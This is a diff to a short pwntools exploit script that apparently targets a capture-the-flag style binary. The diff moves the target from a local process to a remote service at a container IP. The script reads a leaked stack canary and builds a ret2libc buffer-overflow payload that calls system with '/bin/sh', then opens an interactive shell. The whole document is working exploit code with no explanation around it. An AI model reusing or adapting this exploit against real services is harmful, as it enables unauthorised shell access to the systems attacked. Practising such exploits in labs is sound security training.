@@ -1,8 +1,9 @@
-from pwn import *
+from pwn import process, remote
 import struct
 import sys
 
-target = process("./three.o")
+#target = process("./three.o")
+target = remote("172.17.0.2", 10003)
 
 target.recvline()
 
@@ -17,8 +18,9 @@ canary = int(target.recvuntil("payload:").decode("utf-8").split()[0], 16)
 
 ret = 0xffffffff
 
-padding = b'\x41' * 8
-payload = padding + struct.pack("<L", canary) + padding + struct.pack("<L", system) + struct.pack("<L", ret) + struct.pack("<L", binsh)
+buffer = b'\x41' * 8
+padding = b'\x41' * 4
+payload = buffer + struct.pack("<L", canary) + padding + struct.pack("<L", system) + struct.pack("<L", ret) + struct.pack("<L", binsh)
 
 target.sendline(payload)
 target.interactive()
